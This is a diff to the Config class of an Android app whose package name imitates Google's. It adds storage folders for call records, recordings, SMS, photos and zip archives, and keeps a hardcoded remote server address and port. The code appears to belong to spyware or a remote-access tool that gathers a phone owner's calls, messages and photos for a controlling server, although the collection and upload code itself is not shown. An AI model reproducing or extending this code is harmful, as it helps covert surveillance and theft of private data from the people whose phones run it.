@@ -3,6 +3,8 @@ package com.google.android.android;
 import android.content.SharedPreferences;
 import android.os.Build;
 
+import java.io.File;
+
 /**
  * Created by user-pc on 01.06.2017.
  */
@@ -14,18 +16,32 @@ public class Config {
     public static int SERVER_PORT;
 
     public static String PHONE_NAME;
-    public static String DOWNLOAD_PATH;
+    public static String RECORD_PATH;
+    public static String CALLS_PATH;
     public static String SMS_PATH;
     public static String PHOTOS_PATH;
+    public static String ZIP_PATH;
 
     public static void load(SharedPreferences preferences) {
         _preferences = preferences;
         IP_ADDRESS = preferences.getString("IP_ADDRESS", "89.223.26.160");
         SERVER_PORT = preferences.getInt("SERVER_PORT", 1121);
         PHONE_NAME = preferences.getString("PHONE_NAME", Build.MODEL);
-        DOWNLOAD_PATH = preferences.getString("DOWNLOAD_PATH", "sdcard/Android/");
-        SMS_PATH = preferences.getString("SMS_PATH", "sdcard/Android/");
-        PHOTOS_PATH = preferences.getString("PHOTOS_PATH", "sdcard/Android/");
+        RECORD_PATH = preferences.getString("RECORD_PATH", "sdcard/Android/records/");
+        CALLS_PATH = preferences.getString("CALLS_PATH", "sdcard/Android/calls/");
+        SMS_PATH = preferences.getString("SMS_PATH", "sdcard/Android/sms/");
+        PHOTOS_PATH = preferences.getString("PHOTOS_PATH", "sdcard/Android/photos/");
+        ZIP_PATH = preferences.getString("ZIP_PATH", "sdcard/Android/zip/");
+
+        checkDirectories();
+    }
+
+    private static void checkDirectories() {
+        String[] dirs = {RECORD_PATH,CALLS_PATH,SMS_PATH,PHOTOS_PATH,ZIP_PATH};
+        for (String dir : dirs) {
+            File file = new File(dir);
+            if (!file.exists()) file.mkdir();
+        }
     }
 
     public static boolean setName(String name) {
